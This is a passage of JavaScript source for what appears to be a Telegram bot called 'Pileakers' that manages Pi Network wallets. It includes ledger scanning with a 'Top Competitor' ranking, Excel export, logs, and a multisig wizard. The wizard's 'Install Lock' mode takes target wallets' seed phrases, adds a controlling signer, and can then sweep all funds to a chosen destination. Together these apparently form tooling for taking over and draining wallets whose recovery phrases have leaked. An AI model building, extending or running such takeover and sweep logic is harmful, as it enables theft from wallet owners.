            return renderNewBotTopupTargetPicker(chatId, callbackQuery, state);
        }
        return renderNewBotSweepPicker(chatId, callbackQuery, state);
    }
    if (data === "botnew:topuptarget:manual") {
        state.step = "topup_target_manual";
        saveNewBotWizard(chatId, state);
        return telegramEditOrSend(callbackQuery, "Kirim angka target top up PI di atas native base 1 PI.\nContoh: <code>0.07</code>", newBotCancelKeyboard());
    }
    if (data.startsWith("botnew:topuptarget:")) {
        const value = data.slice("botnew:topuptarget:".length);
        if (!TELEGRAM_TOPUP_TARGET_OPTIONS.includes(value)) throw new Error("Topup target tidak valid");
        state.data.topup_target_balance = value;
        saveNewBotWizard(chatId, state);
        return renderNewBotSweepPicker(chatId, callbackQuery, state);
    }
    if (data === "botnew:sweep:on" || data === "botnew:sweep:off") {
        state.data.sweep_helpers = data.endsWith(":on");
        saveNewBotWizard(chatId, state);
        return renderNewBotReview(chatId, callbackQuery, state);
    }
    if (data === "botnew:create") {
        return createNewBotFromWizard(chatId, callbackQuery, state);
    }

    throw new Error("Callback Set New Bot tidak dikenal");
}


function parseTelegramLedgerNumber(value, label) {
    const raw = String(value || "").trim();
    if (!/^\d+$/.test(raw)) {
        throw new Error(`${label} harus angka ledger yang valid`);
    }
    const parsed = Number.parseInt(raw, 10);
    if (!Number.isSafeInteger(parsed) || parsed < 1) {
        throw new Error(`${label} harus angka ledger yang valid`);
    }
    return parsed;
}

function parseTelegramLedgerRange(text) {
    const parts = String(text || "").split(/[|\s,;]+/).map((item) => item.trim()).filter(Boolean);
    if (!parts.length) {
        throw new Error("Format ledger: START|END atau START");
    }
    const ledger = parseTelegramLedgerNumber(parts[0], "Ledger Start");
    const ledgerEnd = parseTelegramLedgerNumber(parts[1] || parts[0], "Ledger End");
    if (ledgerEnd < ledger) {
        throw new Error("Ledger End tidak boleh lebih kecil dari Ledger Start");
    }
    if ((ledgerEnd - ledger + 1) > 1000) {
        throw new Error("Range ledger maksimal 1000");
    }
    return { ledger, ledgerEnd };
}

function getLedgerScannerApiUrl(pathname, params = {}) {
    const cleanPath = String(pathname || "").startsWith("/") ? String(pathname || "") : `/${pathname}`;
    const query = new URLSearchParams();
    Object.entries(params || {}).forEach(([key, value]) => {
        if (value !== undefined && value !== null && String(value).trim() !== "") {
            query.set(key, String(value));
        }
    });
    const qs = query.toString();
    return `${LEDGER_SCANNER_API_URL}${cleanPath}${qs ? `?${qs}` : ""}`;
}

function normalizeLedgerScannerPayload(payload) {
    const data = payload && typeof payload === "object" ? payload : {};
    return {
        wallet_summary: Array.isArray(data.wallet_summary) ? data.wallet_summary : [],
        claim_only_summary: Array.isArray(data.claim_only_summary) ? data.claim_only_summary : [],
        rows: Array.isArray(data.rows) ? data.rows : [],
        all_total_fee: data.all_total_fee ?? 0,
        all_total_tx: data.all_total_tx ?? 0,
        scan_meta: {
            ...(data.scan_meta || {}),
            source: "external_ledger_scanner",
            api_url: LEDGER_SCANNER_API_URL,
        },
    };
}

async function callLedgerScannerApi(pathname, params = {}, options = {}) {
    const response = await axios.get(getLedgerScannerApiUrl(pathname, params), {
        timeout: options.timeout ?? LEDGER_SCANNER_TIMEOUT_MS,
        responseType: options.responseType || "json",
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
    });
    return response.data;
}

async function detectTelegramLedgerRangeFromHorizon(wallet) {
    const response = await axios.get(
        `${TELEGRAM_LEDGER_API_URL}/accounts/${encodeURIComponent(wallet)}/transactions?include_failed=true&limit=1&order=desc`,
        { timeout: LEDGER_SCANNER_DETECT_TIMEOUT_MS }
    );
    const latestLedger = Number.parseInt(response.data?._embedded?.records?.[0]?.ledger, 10);
    if (!Number.isSafeInteger(latestLedger) || latestLedger < 1) {
        throw new Error("Ledger terakhir tidak ditemukan dari wallet ini");
    }
    return { ledger: Math.max(1, latestLedger - 10), ledgerEnd: latestLedger };
}

async function detectTelegramLedgerRange(wallet) {
    try {
        const data = await callLedgerScannerApi("/api/detect-range", { wallet }, { timeout: LEDGER_SCANNER_DETECT_TIMEOUT_MS });
        const start = Number.parseInt(String(data?.start || ""), 10);
        const end = Number.parseInt(String(data?.end || ""), 10);
        if (Number.isSafeInteger(start) && Number.isSafeInteger(end) && start > 0 && end >= start) {
            return { ledger: start, ledgerEnd: end };
        }
        throw new Error("Ledger scanner tidak mengembalikan range valid");
    } catch (error) {
        broadcastLog(`Ledger scanner detect-range gagal (${error.message || error}). Fallback ke Horizon langsung.`, "warning");
        return detectTelegramLedgerRangeFromHorizon(wallet);
    }
}

async function fetchTelegramLedgerScanData(wallet, ledger, ledgerEnd) {
    const data = await callLedgerScannerApi("/api/scan", {
        wallet,
        ledger: String(ledger),
        ledger_end: String(ledgerEnd),
    }, { timeout: getTelegramLedgerScanTimeoutMs() });
    return normalizeLedgerScannerPayload(data);
}

function saveTelegramLedgerScan(scan) {
    const id = crypto.randomUUID().replace(/-/g, "").slice(0, 12);
    telegramControlState.ledgerScans.set(id, { ...scan, id, created_at: Date.now() });
    const maxAgeMs = 60 * 60 * 1000;
    for (const [key, value] of telegramControlState.ledgerScans.entries()) {
        if (telegramControlState.ledgerScans.size > 30 || Date.now() - Number(value.created_at || 0) > maxAgeMs) {
            telegramControlState.ledgerScans.delete(key);
        }
    }
    return id;
}

function getTelegramLedgerScan(id) {
    const key = String(id || "");
    const scan = telegramControlState.ledgerScans.get(key) || null;
    if (!scan) {
        return null;
    }
    const maxAgeMs = 60 * 60 * 1000;
    if (Date.now() - Number(scan.created_at || 0) > maxAgeMs) {
        telegramControlState.ledgerScans.delete(key);
        return null;
    }
    return scan;
}

function telegramLedgerExcelFilename(scan) {
    const safeLedger = String(scan?.ledger || "ledger").replace(/[^0-9A-Za-z_-]/g, "_");
    const safeLedgerEnd = String(scan?.ledgerEnd || safeLedger).replace(/[^0-9A-Za-z_-]/g, "_");
    return `Pileakers_${safeLedger}_${safeLedgerEnd}.xlsx`;
}

async function buildTelegramLedgerExcelBuffer(scan) {
    const params = {
        wallet: scan.wallet,
        ledger: String(scan.ledger),
        ledger_end: String(scan.ledgerEnd),
    };
    try {
        const response = await axios.get(getLedgerScannerApiUrl("/api/download", params), {
            responseType: "arraybuffer",
            timeout: LEDGER_SCANNER_TIMEOUT_MS,
            maxContentLength: Infinity,
            maxBodyLength: Infinity,
        });
        return Buffer.from(response.data);
    } catch (error) {
        broadcastLog(`Download Excel dari Ledger Scanner gagal (${error.message || error}). Fallback ke generator lokal.`, "warning");
        const query = new URLSearchParams(params);
        const localUrl = `http://127.0.0.1:${PORT}/api/ledger/download?${query.toString()}`;
        const response = await axios.get(localUrl, {
            responseType: "arraybuffer",
            timeout: LEDGER_SCANNER_TIMEOUT_MS,
            maxContentLength: Infinity,
            maxBodyLength: Infinity,
        });
        return Buffer.from(response.data);
    }
}

function multipartEscapeName(value) {
    return String(value || "file")
        .replace(/[\\"]/g, "_")
        .replace(/[\r\n]/g, "_");
}

async function telegramSendDocumentBuffer(chatId, buffer, filename, caption = "", keyboard = null) {
    const settings = normalizeTelegramSettings(await getSettings());
    if (!settings.telegram_bot_token) {
        throw new Error("Telegram bot token belum diset");
    }

    const boundary = `----PileakersTelegramBoundary${crypto.randomBytes(16).toString("hex")}`;
    const chunks = [];
    const appendField = (name, value) => {
        chunks.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="${multipartEscapeName(name)}"\r\n\r\n${String(value ?? "")}\r\n`));
    };

    appendField("chat_id", String(chatId));
    if (caption) {
        appendField("caption", caption);
        appendField("parse_mode", "HTML");
    }
    if (keyboard) {
        appendField("reply_markup", JSON.stringify(keyboard));
    }

    const safeFilename = multipartEscapeName(filename || "ledger.xlsx");
    chunks.push(Buffer.from(
        `--${boundary}\r\n` +
        `Content-Disposition: form-data; name="document"; filename="${safeFilename}"\r\n` +
        `Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet\r\n\r\n`
    ));
    chunks.push(Buffer.isBuffer(buffer) ? buffer : Buffer.from(buffer));
    chunks.push(Buffer.from(`\r\n--${boundary}--\r\n`));

    const body = Buffer.concat(chunks);
    const response = await axios.post(
        `https://api.telegram.org/bot${settings.telegram_bot_token}/sendDocument`,
        body,
        {
            headers: {
                "Content-Type": `multipart/form-data; boundary=${boundary}`,
                "Content-Length": body.length,
            },
            timeout: LEDGER_SCANNER_TIMEOUT_MS,
            maxContentLength: Infinity,
            maxBodyLength: Infinity,
        }
    );
    return response.data;
}

function renderLedgerSummaryText(scan, lang = {}) {
    const data = scan.data || {};
    const lines = [
        `<b>${escapeTelegramHtml(lang.ledgerCompleteTitle || "✅ Check Ledger completed")}</b>`,
        `Wallet: <code>${escapeTelegramHtml(shortKey(scan.wallet, 10))}</code>`,
        `Ledger: <b>${escapeTelegramHtml(scan.ledger)} - ${escapeTelegramHtml(scan.ledgerEnd)}</b>`,
        `Total TX: <b>${escapeTelegramHtml(data.all_total_tx ?? 0)}</b>`,
        `Total Fee: <b>${escapeTelegramHtml(data.all_total_fee ?? 0)}</b> PI`,
        "",
    ];

    const walletSummary = Array.isArray(data.wallet_summary) ? data.wallet_summary.slice(0, 10) : [];
    lines.push(`<b>${escapeTelegramHtml(lang.ledgerTopCompetitorTitle || "Top Competitor / Send")}</b>`);
    if (!walletSummary.length) {
        lines.push(escapeTelegramHtml(lang.ledgerNoCompetitor || "No competitor/send data found."));
    } else {
        walletSummary.forEach((item, index) => {
            lines.push(`${index + 1}. <code>${escapeTelegramHtml(shortKey(item.address, 8))}</code> | ${escapeTelegramHtml(formatTelegramStatus(item.status))} | fee ${escapeTelegramHtml(item.total_fee)} | tx ${escapeTelegramHtml(item.tx_count)}`);
        });
    }

    const claimOnlySummary = Array.isArray(data.claim_only_summary) ? data.claim_only_summary.slice(0, 10) : [];
    lines.push("", `<b>${escapeTelegramHtml(lang.ledgerClaimOnlyTitle || "Claim Only")}</b>`);
    if (!claimOnlySummary.length) {
        lines.push(escapeTelegramHtml(lang.ledgerNoClaimOnly || "No claim-only data found."));
    } else {
        claimOnlySummary.forEach((item, index) => {
            lines.push(`${index + 1}. <code>${escapeTelegramHtml(shortKey(item.address, 8))}</code> | fee ${escapeTelegramHtml(item.total_fee_charged)} | tx ${escapeTelegramHtml(item.total_tx)}`);
        });
    }

    const logs = Array.isArray(data.rows) ? data.rows.slice(0, 12) : [];
    lines.push("", `<b>${escapeTelegramHtml(lang.ledgerFirstLogsTitle || "First TX logs")}</b>`);
    if (!logs.length) {
        lines.push(escapeTelegramHtml(lang.ledgerNoLogs || "No matching transactions were found in this range."));
    } else {
        logs.forEach((row, index) => {
            const txStatus = String(row.Success || "").toUpperCase() === "TRUE" ? "Success" : "Failed";
            lines.push(`${index + 1}. ${escapeTelegramHtml(formatTelegramStatus(txStatus))} | ${escapeTelegramHtml(row.Operations)} | fee ${escapeTelegramHtml(row.FeeCharged)} | <code>${escapeTelegramHtml(shortKey(row.Hash, 8))}</code>`);
        });
        if ((data.rows || []).length > logs.length) {
            lines.push(escapeTelegramHtml(formatTelegramLangText(lang.ledgerMoreLogs || "...and {count} more logs. Use Download Excel for the full data.", { count: data.rows.length - logs.length })));
        }
    }

    return lines.join("\n");
}

function getTelegramLedgerScanTimeoutMs() {
    return parseOptionalTimeoutMs(process.env.TELEGRAM_LEDGER_SCAN_TIMEOUT_MS, 0);
}

function withTelegramLedgerTimeout(promise, timeoutMs, message) {
    if (!Number.isFinite(timeoutMs) || timeoutMs <= 0) {
        return promise;
    }
    let timeoutId = null;
    const timeoutPromise = new Promise((_, reject) => {
        timeoutId = setTimeout(() => reject(new Error(message)), timeoutMs);
    });
    return Promise.race([promise, timeoutPromise]).finally(() => clearTimeout(timeoutId));
}

async function runTelegramLedgerScan(chatId, wallet, ledger, ledgerEnd, autoDetect = false, options = {}) {
    const lang = options.lang || (await getCurrentTelegramLanguageBundle()).lang;
    const loading = options.loading || null;
    let range = { ledger, ledgerEnd };

    if (autoDetect) {
        if (loading?.update) {
            await loading.update({
                title: lang.autoDetectProgress || "⏳ Auto detect ledger dan scan data. Tunggu sampai selesai...",
                subtitle: "Step 1/2: mendeteksi range ledger.",
                progressRatio: 0.12,
            }).catch(() => null);
        }
        range = await detectTelegramLedgerRange(wallet);
    }

    if (loading?.update) {
        await loading.update({
            title: autoDetect
                ? `📡 Range ledger ditemukan: ${range.ledger}-${range.ledgerEnd}`
                : (lang.scanLedgerProgress || "⏳ Scan ledger {range}. Tunggu sampai selesai...").replace("{range}", `${range.ledger}-${range.ledgerEnd}`),
            subtitle: "Step 2/2: scanner sedang memproses data transaksi.",
            progressRatio: 0.35,
        }).catch(() => null);
    }

    const scanTimeoutMs = getTelegramLedgerScanTimeoutMs();
    const data = await withTelegramLedgerTimeout(
        fetchTelegramLedgerScanData(wallet, range.ledger, range.ledgerEnd),
        scanTimeoutMs,
        `Check Ledger timeout setelah ${Math.round(scanTimeoutMs / 1000)} detik. Coba scan range ledger lebih kecil atau cek koneksi Ledger Scanner.`
    );

    if (loading?.update) {
        await loading.update({
            title: "✅ Data ledger diterima. Menyiapkan hasil...",
            subtitle: "Membuat ringkasan Download Excel.",
            progressRatio: 0.95,
        }).catch(() => null);
    }

    const scan = { wallet, ledger: range.ledger, ledgerEnd: range.ledgerEnd, data };
    const scanId = saveTelegramLedgerScan(scan);
    const keyboard = {
        inline_keyboard: [
            [{ text: lang.downloadExcelButton || "📥 Download Excel", callback_data: `ledger:excel:${scanId}` }],
            [{ text: lang.rescanButton || "🔄 Rescan", callback_data: `ledger:rescan:${scanId}` }, { text: lang.checkAnotherButton || "🔎 Check Another", callback_data: "menu:ledger" }],
            [{ text: lang.mainMenu || "⬅️ Main Menu", callback_data: "menu:home" }],
        ],
    };
    const output = renderLedgerSummaryText(scan, lang);
    // Final result wajib dikirim lewat loading.stop() agar timer loading berhenti dulu.
    // Jika final result diedit lewat telegramEditOrSend saat timer masih hidup,
    // timer bisa menimpa hasil dan layar kembali ke pesan loading lama.
    if (loading?.stop) {
        return loading.stop(output, keyboard);
    }
    if (options.callbackQuery) {
        return telegramEditOrSend(options.callbackQuery, output, keyboard);
    }
    return telegramSend(chatId, output, keyboard);
}

async function renderTelegramLedger(chatId, editQuery = null) {
    const { language, lang } = await getCurrentTelegramLanguageBundle();
    const text = [
        `<b>${lang.ledgerTitle}</b>`,
        lang.ledgerIntro,
        "",
        lang.ledgerAutoInfo,
        lang.ledgerManualInfo,
    ].join("\n");
    const keyboard = {
        inline_keyboard: [
            [{ text: lang.autoDetectLedger, callback_data: "ledger:input:auto" }],
            [{ text: lang.manualLedgerRange, callback_data: "ledger:input:manual" }],
            [{ text: lang.back, callback_data: "menu:home" }],
        ],
    };
    if (editQuery) {
        return telegramEditOrSend(editQuery, text, keyboard);
    }
    return telegramSend(chatId, text, keyboard);
}
async function renderTelegramFundingHistory(chatId, editQuery = null, page = 0) {
    const [{ language, lang }, settings, history] = await Promise.all([
        getCurrentTelegramLanguageBundle(),
        getSettings().catch(() => ({})),
        listFundingWalletHistory(),
    ]);
    const timezone = publicTimezoneSettings(settings);
    const allEntries = history.entries || [];
    const pageSize = getTelegramPageSize(TELEGRAM_FUNDING_HISTORY_PAGE_SIZE, 5, 1, 10);
    const pageInfo = getTelegramPage(page, allEntries.length, pageSize);
    const entries = allEntries.slice(pageInfo.start, pageInfo.end);
    const lines = [
        `<b>${lang.fundingHistoryTitle}</b>`,
        `${lang.totalMutations}: <b>${escapeTelegramHtml(history.summary.total_mutations ?? 0)}</b>`,
        `${lang.totalLoss}: <b>${escapeTelegramHtml(history.summary.total_loss_pi ?? "0.0000000")}</b> PI`,
        `${lang.pageLabel || "Page"}: <b>${pageInfo.page + 1}/${pageInfo.totalPages}</b>${allEntries.length ? ` | ${pageInfo.start + 1}-${pageInfo.end} / ${allEntries.length}` : ""}`,
        "",
    ];
    if (!entries.length) {
        lines.push(lang.noHistory);
    } else {
        entries.forEach((entry, index) => {
            const number = pageInfo.start + index + 1;
            const botGroup = compactTelegramLogMessage(entry.bot_group || entry.group_name || entry.parent_bot_name || "-", 42);
            const workers = compactTelegramLogMessage(Array.isArray(entry.workers) ? entry.workers.join(", ") : (entry.workers || entry.worker_name || "-"), 32);
            const createdAt = entry.created_at || entry.started_at || entry.time || entry.updated_at || "-";
            const walletName = compactTelegramLogMessage(entry.wallet_name || "Funding", 32);
            lines.push(`${number}. <b>${escapeTelegramHtml(walletName)}</b> | <b>${escapeTelegramHtml(formatTelegramStatus(entry.status))}</b>`);
            lines.push(`   ${lang.time}: <code>${escapeTelegramHtml(formatFundingHistoryTime(createdAt, timezone.user_timezone))}</code>`);
            lines.push(`   ${lang.botGroup}: ${escapeTelegramHtml(botGroup)}`);
            lines.push(`   ${lang.workersLabel}: ${escapeTelegramHtml(workers)} | ${lang.network}: ${escapeTelegramHtml(entry.network || "-")}`);
            lines.push(`   ${lang.balance}: <code>${escapeTelegramHtml(entry.before_pi || "-")}</code> → <code>${escapeTelegramHtml(entry.after_pi || "-")}</code>`);
            lines.push(`   ${lang.deducted}: <b>${escapeTelegramHtml(entry.loss_pi || "0.0000000")}</b> PI | ${lang.amount}: ${escapeTelegramHtml(entry.amount || "-")}`);
        });
    }
    const keyboardRows = [];
    if (pageInfo.totalPages > 1) {
        const navRow = [];
        if (pageInfo.page > 0) {
            navRow.push({ text: lang.previousButton || "⬅️ Prev", callback_data: `funding_history:page:${pageInfo.page - 1}` });
        }
        navRow.push({ text: `${pageInfo.page + 1}/${pageInfo.totalPages}`, callback_data: "noop" });
        if (pageInfo.page < pageInfo.totalPages - 1) {
            navRow.push({ text: lang.nextButton || "Next ➡️", callback_data: `funding_history:page:${pageInfo.page + 1}` });
        }
        keyboardRows.push(navRow);
    }
    keyboardRows.push([{ text: lang.refresh, callback_data: `funding_history:page:${pageInfo.page}` }]);
    keyboardRows.push([{ text: lang.back, callback_data: "menu:home" }]);
    const keyboard = { inline_keyboard: keyboardRows };
    const text = lines.join("\n");
    if (editQuery) {
        return telegramEditOrSend(editQuery, text, keyboard);
    }
    return telegramSend(chatId, text, keyboard);
}
const TELEGRAM_MULTISIG_MODE_OPTIONS = [
    { value: "install_lock", label: "Install Lock", button: "Install Lock" },
    { value: "claim_only", label: "Claim by Funding", button: "Claim" },
    { value: "send_only", label: "Send by Funding", button: "Send" },
    { value: "claim_and_send", label: "Claim + Send by Funding", button: "Claim+Send" },
    { value: "sweep_all", label: "Sweep All", button: "Sweep All" },
    { value: "remove_signer", label: "Hapus Signer by Funding", button: "Hapus Signer" },
];
const TELEGRAM_MULTISIG_BASE_FEE_OPTIONS = ["100000", "500000", "1000000", "5000000"];
const TELEGRAM_MULTISIG_DELAY_OPTIONS = ["3000", "5000", "10000", "15000"];
const TELEGRAM_MULTISIG_RESERVE_OPTIONS = ["0.5", "1", "2"];

function multisigModeLabel(value) {
    const found = TELEGRAM_MULTISIG_MODE_OPTIONS.find((item) => item.value === value);
    return found ? found.label : String(value || "-");
}

function multisigNeedsDestination(mode) {
    return ["send_only", "claim_and_send", "sweep_all"].includes(String(mode || ""));
}

function multisigNeedsAmount(mode) {
    return ["send_only", "claim_and_send", "sweep_all"].includes(String(mode || ""));
}

function multisigUsesReserve(mode) {
    return ["install_lock", "send_only", "claim_and_send", "sweep_all"].includes(String(mode || ""));
}

function getMultisigWizard(chatId) {
    const state = telegramControlState.pendingInputs.get(String(chatId));
    return state && state.action === "multi_wizard" ? state : null;
}

function saveMultisigWizard(chatId, state) {
    telegramControlState.pendingInputs.set(String(chatId), {
        ...state,
        action: "multi_wizard",
        updated_at: Date.now(),
    });
}

async function defaultMultisigData() {
    return {
        mode: "install_lock",
        network: "testnet",
        horizon_server_id: "",
        horizon_url: "",
        horizon_label: "Auto default + backup Manage Servers",
        base_fee_stroops: "100000",
        batch_size: 15,
        batch_delay_ms: "5000",
        fee_payer_id: "",
        funding_wallet_id: "",
        funding_public_key: "",
        funding_label: "-",
        signer_id: "",
        signer_public_key: "",
        signer_label: "-",
        target_phrases: "",
        target_source: "manual",
        target_public_keys: "",
        target_label: "-",
        threshold: 5,
        signer_weight: 5,
        reserve_pi: "0.5",
        destination: "",
        destination_label: "-",
        amount: "ALL",
    };
}

function buildMultisigPayload(data) {
    const payload = {
        mode: data.mode,
        network: data.network || "testnet",
        horizon_server_id: data.horizon_server_id || "",
        horizon_url: data.horizon_url || "",
        base_fee_stroops: data.base_fee_stroops || "100000",
        batch_size: data.batch_size || 15,
        batch_delay_ms: data.batch_delay_ms ?? "5000",
        fee_payer_id: data.fee_payer_id || data.funding_wallet_id,
        funding_wallet_id: data.funding_wallet_id || data.fee_payer_id,
        funding_public_key: data.funding_public_key || "",
        signer_id: data.signer_id || "",
        signer_public_key: data.signer_public_key || "",
        signer_label: data.signer_label || "",
        target_phrases: data.mode === "install_lock" ? String(data.target_phrases || "") : "",
        target_source: data.target_source || "manual",
        target_public_keys: data.mode === "install_lock" ? "" : String(data.target_public_keys || ""),
        threshold: data.threshold || 5,
        signer_weight: data.signer_weight || data.threshold || 5,
        reserve_pi: data.reserve_pi || "0.5",
        destination: multisigNeedsDestination(data.mode) ? data.destination : "",
        amount: data.mode === "sweep_all" ? "ALL" : (multisigNeedsAmount(data.mode) ? (data.amount || "ALL") : ""),
    };
    if (!payload.fee_payer_id) throw new Error("Funding Wallet wajib dipilih");
    if (!payload.signer_id && !payload.signer_public_key) throw new Error("Signer Wallet wajib dipilih");
    if (payload.mode === "install_lock" && !payload.target_phrases.trim()) throw new Error("Target phrase wajib diisi untuk Install Lock");
    if (multisigNeedsDestination(payload.mode) && !payload.destination) throw new Error("Destination wallet wajib diisi");
    return payload;
}

function multisigCancelKeyboard() {
    return { inline_keyboard: [[{ text: "❌ Batal", callback_data: "multi:cancel" }], [{ text: "⬅️ Multisig", callback_data: "menu:multisig" }]] };
}

function telegramLogTypeLabel(type) {
    const normalized = String(type || "info").trim().toLowerCase();
    if (["success", "ok", "done"].includes(normalized)) return "✅ SUCCESS";
    if (["error", "err", "failed", "fail"].includes(normalized)) return "❌ ERROR";
    if (["warning", "warn"].includes(normalized)) return "⚠️ WARN";
    return "ℹ️ INFO";
}

function compactTelegramLogMessage(message, maxLength = 160) {
    let text = String(message || "-")
        .replace(/[\u0000-\u001f\u007f]+/g, " ")
        .replace(/\s+/g, " ")
        .replace(/\s*([|:;,])\s*/g, "$1 ")
        .trim();

    text = text.replace(/\bG[A-Z2-7]{55}\b/g, (value) => shortKey(value, 8));
    text = text.replace(/\b[0-9a-f]{48,}\b/gi, (value) => shortKey(value, 10));
    text = text.replace(/\b[A-Za-z0-9+/]{96,}={0,2}\b/g, (value) => shortKey(value, 12));
    text = text.replace(/\b(token|secret|password|passphrase|mnemonic)\s*[:=]\s*[^,\s|]+/gi, "$1=***");

    if (text.length <= maxLength) {
        return text || "-";
    }

    const cutAt = text.lastIndexOf(" ", Math.max(0, maxLength - 3));
    const end = cutAt >= Math.floor(maxLength * 0.65) ? cutAt : Math.max(0, maxLength - 3);
    return `${text.slice(0, end).trim()}...`;
}

async function renderTelegramLogs(chatId, editQuery = null, page = 0) {
    const { language, lang } = await getCurrentTelegramLanguageBundle();
    const allRows = telegramRecentLogs.slice().reverse();
    const pageSize = getTelegramPageSize(TELEGRAM_LIVE_LOG_PAGE_SIZE, 10, 5, 20);
    const pageInfo = getTelegramPage(page, allRows.length, pageSize);
    const rows = allRows.slice(pageInfo.start, pageInfo.end);
    const lines = [
        `<b>${escapeTelegramHtml(lang.logsTitle || "📜 Live Logs")}</b>`,
        `Halaman: <b>${pageInfo.page + 1}/${pageInfo.totalPages}</b>${allRows.length ? ` | ${pageInfo.start + 1}-${pageInfo.end} dari ${allRows.length}` : ""}`,
        `Log terbaru ada di halaman 1. Tekan refresh untuk update.`,
        "",
    ];
    if (!rows.length) {
        lines.push(escapeTelegramHtml(lang.noLogs || "Belum ada log."));
    } else {
        rows.forEach((log, index) => {
            const number = String(index + 1).padStart(2, "0");
            const typeLabel = telegramLogTypeLabel(log.type);
            const time = escapeTelegramHtml(log.time || "--:--:--");
            const message = escapeTelegramHtml(compactTelegramLogMessage(log.message, 120));
            lines.push(`${number}. ${typeLabel} <code>${time}</code>`);
            lines.push(`    ${message}`);
        });
    }
    const keyboardRows = [];
    if (pageInfo.totalPages > 1) {
        const navRow = [];
        if (pageInfo.page > 0) {
            navRow.push({ text: "⬅️ Newer", callback_data: `logs:page:${pageInfo.page - 1}` });
        }
        navRow.push({ text: `${pageInfo.page + 1}/${pageInfo.totalPages}`, callback_data: "noop" });
        if (pageInfo.page < pageInfo.totalPages - 1) {
            navRow.push({ text: "Older ➡️", callback_data: `logs:page:${pageInfo.page + 1}` });
        }
        keyboardRows.push(navRow);
    }
    keyboardRows.push([{ text: "🔄 Refresh Logs", callback_data: "menu:logs" }]);
    keyboardRows.push([{ text: lang.back, callback_data: "menu:home" }]);
    const keyboard = { inline_keyboard: keyboardRows };
    const text = lines.join("\n");
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}
async function renderTelegramMultisig(chatId, editQuery = null) {
    const [locked, savedWallets, signers, pending, settings, signerWatch] = await Promise.all([
        listMultisigLockedWallets().catch(() => []),
        listMultisigSavedWallets().catch(() => []),
        listMultisigSigners().catch(() => []),
        listMultisigPendingLocks().catch(() => []),
        getSettings(),
        getMultisigSignerWatchState().catch(() => multisigSignerWatchDefaultState()),
    ]);
    const timezone = publicTimezoneSettings(settings);
    const language = publicTelegramLanguageSettings(settings);
    const lang = getTelegramLanguageText(language.telegram_language);
    const lines = [
        `<b>${lang.multisigTitle}</b>`,
        `${lang.lockedWallet}: <b>${locked.length}</b>`,
        `${lang.savedWalletList}: <b>${savedWallets.length}</b>`,
        `${lang.signerWallet || "✍️ Signer Wallet"}: <b>${signers.length}</b>`,
        `${lang.pendingLock}: <b>${pending.length}</b>`,
        `Signer Watch: <b>${escapeTelegramHtml(formatTelegramStatus(signerWatch.status || "idle"))}</b>${signerWatch.test_public_key ? ` | Test: <code>${escapeTelegramHtml(shortKey(signerWatch.test_public_key, 6))}</code>` : ""}`,
        `${lang.defaultTimezone}: <b>${timezone.label}</b>`,
        "",
        lang.multisigIntro,
    ];
    const keyboard = {
        inline_keyboard: [
            [{ text: lang.runSetMode, callback_data: "multi:start" }],
            [{ text: lang.addSigner || "➕ Add Signer", callback_data: "multi:add_signer" }, { text: lang.manageSigners || "✍️ Signer Wallets", callback_data: "multi:signers" }],
            [{ text: lang.saveWalletList, callback_data: "multi:save_wallets" }, { text: lang.runSavedBatch, callback_data: "multi:run_saved" }],
            [{ text: lang.setSignerTestWallet || "🧪 Set Test Wallet", callback_data: "multi:watch:set_test" }, { text: lang.watchSignerAutoInstall || "🔁 Watch Signer Auto Install", callback_data: "multi:watch:start" }],
            ...(["watching", "running_batch", "signer_ready"].includes(String(signerWatch.status || "")) ? [[{ text: lang.stopBatchInstallLock || "⛔ Stop Batch Install Lock", callback_data: "multi:watch:stop" }]] : []),
            [{ text: lang.manageSavedWallets, callback_data: "multi:saved_wallets" }],
            [{ text: lang.withdrawAllAssets, callback_data: "multi:start:claim_and_send" }, { text: lang.sweepAll, callback_data: "multi:start:sweep_all" }],
            [{ text: lang.removeAllSigner, callback_data: "multi:start:remove_signer" }],
            [{ text: lang.locked, callback_data: "multi:locked" }, { text: lang.pending, callback_data: "multi:pending" }],
            [{ text: lang.protocolMainnet, callback_data: "multi:protocol:mainnet" }, { text: lang.protocolTestnet, callback_data: "multi:protocol:testnet" }],
            [{ text: lang.back, callback_data: "menu:home" }],
        ],
    };
    const text = lines.join("\n");
    if (editQuery) {
        return telegramEditOrSend(editQuery, text, keyboard);
    }
    return telegramSend(chatId, text, keyboard);
}
async function startMultisigWizard(chatId, editQuery = null, presetMode = "") {
    const data = await defaultMultisigData();
    if (presetMode && TELEGRAM_MULTISIG_MODE_OPTIONS.some((item) => item.value === presetMode)) {
        data.mode = presetMode;
    }
    const state = { action: "multi_wizard", step: "mode", data, created_at: Date.now() };
    saveMultisigWizard(chatId, state);
    if (presetMode) {
        return renderMultisigNetworkPicker(chatId, editQuery, state);
    }
    return renderMultisigModePicker(chatId, editQuery, state);
}

async function startMultisigSavedBatchWizard(chatId, editQuery = null) {
    const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
    const savedWallets = await listMultisigSavedWallets();
    if (!savedWallets.length) {
        return editQuery
            ? telegramEditOrSend(editQuery, tgLang.savedWalletRunEmpty, telegramBackKeyboard("menu:multisig"))
            : telegramSend(chatId, tgLang.savedWalletRunEmpty, telegramBackKeyboard("menu:multisig"));
    }
    const data = await defaultMultisigData();
    data.mode = "install_lock";
    data.target_source = "saved_list";
    data.target_label = `${savedWallets.length} saved wallet`;
    const state = { action: "multi_wizard", step: "network", data, created_at: Date.now() };
    saveMultisigWizard(chatId, state);
    return renderMultisigNetworkPicker(chatId, editQuery, state);
}

async function renderMultisigModePicker(chatId, editQuery = null, state = null) {
    state = state || getMultisigWizard(chatId) || { data: await defaultMultisigData() };
    state.step = "mode";
    saveMultisigWizard(chatId, state);
    const rows = TELEGRAM_MULTISIG_MODE_OPTIONS.map((item) => [{
        text: `${state.data.mode === item.value ? "✅ " : ""}${item.button}`,
        callback_data: `multi:mode:${item.value}`,
    }]);
    rows.push([{ text: "❌ Batal", callback_data: "multi:cancel" }]);
    const text = "<b>🔐 Multisig Mode</b>\nPilih mode yang ingin dijalankan.";
    return editQuery ? telegramEditOrSend(editQuery, text, { inline_keyboard: rows }) : telegramSend(chatId, text, { inline_keyboard: rows });
}

async function renderMultisigNetworkPicker(chatId, editQuery = null, state = null) {
    state = state || getMultisigWizard(chatId);
    if (!state) return startMultisigWizard(chatId, editQuery);
    state.step = "network";
    saveMultisigWizard(chatId, state);
    const keyboard = { inline_keyboard: [
